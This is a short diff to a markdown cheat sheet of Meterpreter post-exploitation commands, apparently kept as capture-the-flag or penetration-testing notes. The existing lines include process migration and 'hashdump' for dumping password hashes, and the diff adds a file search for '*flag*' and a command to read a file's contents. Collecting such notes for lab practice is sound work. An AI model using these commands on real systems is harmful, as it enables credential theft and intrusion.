@@ -93,6 +93,12 @@ meterpreter > migrate PROCESS-ID
 
 # Dump passwords hashes
 meterpreter > hashdump
+
+# Find files by name
+meterpreter > search -f *flag*
+
+# print content in C:\some\path\with.file
+meterpreter > cat /some/path/with.file
 ```
 
 ## Convert shell to meterpreter shell
